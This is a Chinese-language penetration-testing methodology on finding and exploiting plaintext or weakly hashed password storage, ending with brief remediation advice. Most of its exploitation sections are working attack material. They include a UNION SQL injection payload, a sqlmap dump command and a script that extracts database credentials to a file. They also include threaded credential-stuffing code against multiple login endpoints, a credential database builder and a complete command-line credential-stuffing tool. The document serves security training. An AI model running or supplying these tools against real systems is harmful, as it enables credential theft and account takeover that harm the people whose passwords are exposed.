# 明文凭证存储攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的明文凭证存储检测与利用流程，帮助发现和利用因密码未加密存储导致的凭证泄露漏洞。

## 1.2 适用范围

本文档适用于所有可访问数据库或配置文件的 Web 应用、API 服务和系统。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

明文凭证存储是指应用程序将用户密码以未加密（plaintext）形式存储在数据库或配置文件中，而非使用安全的哈希算法（如 bcrypt、argon2、scrypt）进行加密存储。

**本质问题**：
- 密码未进行哈希处理
- 使用弱哈希算法（MD5、SHA1）
- 缺少盐值（salt）
- 可逆加密而非单向哈希

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-256 | 明文存储密码 |
| CWE-916 | 使用不安全的密码哈希 |
| CWE-328 | 使用弱哈希算法 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 传统 Web 应用 | 用户登录 | 数据库明文存储 |
| 内部系统 | 员工登录 | 无安全要求 |
| 老旧应用 | 遗留系统 | 历史遗留问题 |
| 快速原型 | MVP 产品 | 安全被忽略 |
| CTF 挑战 | 练习环境 | 故意设计 |

## 2.3 漏洞发现方法

### 2.3.1 数据库结构分析

```sql
-- 检查用户表结构
DESCRIBE user;
DESCRIBE users;
DESCRIBE accounts;

-- 查看密码字段类型
-- 危险信号：
-- - VARCHAR(100) 或类似字符串类型（可能是明文）
-- - 长度固定且较短（可能是弱哈希）
-- - 字段名为 password_plain、pwd_clear 等
```

### 2.3.2 数据内容检查

```sql
-- 查看密码字段内容
SELECT username, password FROM user LIMIT 10;

-- 明文密码特征：
-- - 可读字符串（如 'test123'、'password'）
-- - 长度不一
-- - 包含常见字符

-- 哈希密码特征：
-- - MD5: 32 位十六进制
-- - SHA1: 40 位十六进制
-- - bcrypt: $2a$、$2b$ 或 $2y$ 开头
```

### 2.3.3 源代码审计

**查找密码比较逻辑**：

```bash
# 搜索直接密码比较
grep -rn "password\s*==" --include="*.py" --include="*.java" --include="*.php" .
grep -rn "password\s*=\s*request" --include="*.py" .
grep -rn "filter_by.*password" --include="*.py" .
```

**危险代码模式**：

```python
# 危险模式 1：直接比较
user = User.query.filter_by(username=username, password=password).first()

# 危险模式 2：明文存储
user.password = request.form['password']  # 无哈希

# 危险模式 3：弱哈希
import hashlib
hashed = hashlib.md5(password.encode()).hexdigest()  # 弱算法
```

### 2.3.4 SQL 注入辅助检测

```bash
# 如果存在 SQL 注入，可直接查询密码
' UNION SELECT username, password FROM user --

# 使用 sqlmap 提取
sqlmap -u "http://target.com/login" --data="username=admin&password=test" \
  --tables -D database --dump -T user
```

## 2.4 漏洞利用方法

### 2.4.1 数据库直接访问

**前提条件**：能够执行 SQL 查询（通过 SQL 注入、后台访问等）

```sql
-- 提取所有用户凭证
SELECT id, username, password, email FROM user;

-- 导出为文本
SELECT username, password FROM user INTO OUTFILE '/tmp/credentials.txt';
```

**Python 脚本提取**：

```python
import pymysql

# 连接数据库
connection = pymysql.connect(
    host='target_db',
    user='app_user',
    password='app_password',
    database='target_db'
)

cursor = connection.cursor()

# 提取凭证
cursor.execute("SELECT username, password FROM user")
credentials = cursor.fetchall()

# 保存凭证
with open('credentials.txt', 'w') as f:
    for username, password in credentials:
        f.write(f"{username}:{password}\n")

print(f"[+] Extracted {len(credentials)} credentials")
```

### 2.4.2 凭证重用攻击

```python
import requests

# 读取提取的凭证
credentials = {}
with open('credentials.txt', 'r') as f:
    for line in f:
        username, password = line.strip().split(':')
        credentials[username] = password

# 尝试登录目标系统
def test_credentials(username, password, login_url):
    response = requests.post(login_url, 
        data={'username': username, 'password': password},
        allow_redirects=False)
    
    if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
        return True
    return False

# 批量测试
for username, password in credentials.items():
    if test_credentials(username, password, 'http://target.com/login'):
        print(f"[+] Valid credentials: {username}:{password}")
```

### 2.4.3 跨系统凭证填充

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# 常见系统登录端点
targets = [
    ('http://app1.com/login', 'username', 'password'),
    ('http://app2.com/api/auth', 'user', 'pass'),
    ('http://admin.internal/login', 'username', 'password'),
]

def credential_stuffing(credentials, target_info):
    """在多个系统上尝试相同凭证"""
    url, user_field, pass_field = target_info
    
    for username, password in credentials.items():
        try:
            response = requests.post(url,
                data={user_field: username, pass_field: password},
                timeout=5)
            
            if 'welcome' in response.text.lower() or response.status_code == 302:
                print(f"[+] Success: {username}:{password} @ {url}")
                return username, password
        except:
            continue
    
    return None, None

# 并发执行
with ThreadPoolExecutor(max_workers=10) as executor:
    for target in targets:
        executor.submit(credential_stuffing, credentials, target)
```

### 2.4.4 密码模式分析

```python
from collections import Counter
import re

def analyze_password_patterns(credentials):
    """分析密码模式，生成更有针对性的字典"""
    
    passwords = list(credentials.values())
    
    # 常见模式
    patterns = {
        '数字后缀': r'^[a-zA-Z]+(\d+)$',
        '年份后缀': r'.*(202[0-4]|201[0-9])$',
        '特殊字符结尾': r'.*[!@#$%^&*]$',
        '首字母大写': r'^[A-Z][a-z]+',
        '键盘模式': r'(qwerty|asdf|1234)',
    }
    
    print("=== 密码模式分析 ===\n")
    
    for pattern_name, pattern in patterns.items():
        matches = [p for p in passwords if re.match(pattern, p, re.IGNORECASE)]
        if matches:
            print(f"{pattern_name}: {len(matches)} 个密码")
            print(f"  示例：{matches[:5]}\n")
    
    # 常见密码统计
    common = Counter(passwords).most_common(10)
    print("=== 最常见密码 ===")
    for pwd, count in common:
        print(f"  {pwd}: {count} 次使用")
```

## 2.5 组合攻击链

### 2.5.1 SQL 注入 + 明文凭证

```
1. 发现 SQL 注入漏洞
   → 在登录表单或搜索框

2. 使用 UNION 注入提取凭证
   → ' UNION SELECT username, password FROM user --

3. 获取所有用户明文密码
   → 保存用于后续利用

4. 使用凭证登录系统
   → 完全接管账户
```

### 2.5.2 IDOR + 明文凭证

```
1. 利用 IDOR 访问用户数据
   → 获取用户邮箱、姓名等 PII

2. 使用 PII 进行密码重置
   → 如果密码重置问题基于 PII

3. 或者直接使用明文密码
   → 如果数据库可访问
```

### 2.5.3 会话伪造 + 明文凭证

```
1. 利用硬编码密钥伪造会话
   → 获得初始访问

2. 访问用户管理功能
   → 导出用户数据

3. 提取明文密码
   → 凭证收集完成
```

## 2.6 后渗透利用

### 2.6.1 凭证数据库构建

```python
import sqlite3
from datetime import datetime

def build_credential_db(credentials, source):
    """构建凭证数据库用于后续攻击"""
    
    conn = sqlite3.connect('credential_database.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (username TEXT, password TEXT, source TEXT, 
                  timestamp TEXT, reused INTEGER DEFAULT 0)''')
    
    for username, password in credentials.items():
        c.execute('INSERT INTO credentials VALUES (?, ?, ?, ?, 0)',
                 (username, password, source, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    print(f"[+] Stored {len(credentials)} credentials in database")
```

### 2.6.2 自动化凭证测试

```python
#!/usr/bin/env python3
"""
自动化凭证填充工具
"""

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

def load_credentials(filepath):
    credentials = []
    with open(filepath, 'r') as f:
        for line in f:
            if ':' in line:
                parts = line.strip().split(':', 1)
                if len(parts) == 2:
                    credentials.append((parts[0], parts[1]))
    return credentials

def test_login(url, username, password, user_field='username', pass_field='password'):
    try:
        response = requests.post(url,
            data={user_field: username, pass_field: password},
            timeout=10,
            allow_redirects=False)
        
        # 检测登录成功的标志
        success_indicators = [
            response.status_code == 302,
            'welcome' in response.text.lower(),
            'dashboard' in response.text.lower(),
            'logout' in response.text.lower()
        ]
        
        return any(success_indicators)
    except:
        return False

def main():
    parser = argparse.ArgumentParser(description='凭证填充工具')
    parser.add_argument('-u', '--url', required=True, help='登录 URL')
    parser.add_argument('-f', '--file', required=True, help='凭证文件')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发数')
    
    args = parser.parse_args()
    
    credentials = load_credentials(args.file)
    print(f"[*] Loaded {len(credentials)} credentials")
    
    valid_count = 0
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                test_login, 
                args.url, 
                username, 
                password
            ): (username, password) 
            for username, password in credentials
        }
        
        for future in as_completed(futures):
            username, password = futures[future]
            if future.result():
                print(f"[+] VALID: {username}:{password}")
                valid_count += 1
    
    print(f"\n[*] Completed. {valid_count} valid credentials found.")

if __name__ == '__main__':
    main()
```

---

# 第三部分：附录

## 3.1 密码哈希识别

| 哈希类型 | 特征 | 示例 |
|---------|------|------|
| 明文 | 可读字符串 | `password123` |
| MD5 | 32 位十六进制 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SHA1 | 40 位十六进制 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| SHA256 | 64 位十六进制 | `5e884898da28047d9...` |
| bcrypt | $2a$/开头 | `$2a$10$N9qo8uLOickgx2ZMRZoMy` |
| argon2 | $argon2id$开头 | `$argon2id$v=19$m=65536...` |

## 3.2 哈希破解工具

| 工具 | 用途 |
|-----|------|
| Hashcat | GPU 加速哈希破解 |
| John the Ripper | 多格式哈希破解 |
| hash-identifier | 哈希类型识别 |
| CrackStation | 在线哈希破解 |

## 3.3 修复建议

1. **使用强哈希算法**：bcrypt、argon2、scrypt
2. **添加盐值**：每个密码使用唯一随机盐
3. **密钥派生**：使用 PBKDF2、bcrypt 等 KDF
4. **密码策略**：强制复杂度要求
5. **定期审计**：检查密码存储方式

---

**文档版本**：1.0  
**最后更新**：2026-03-08  
**参考来源**：XBEN-001-24 渗透测试实战
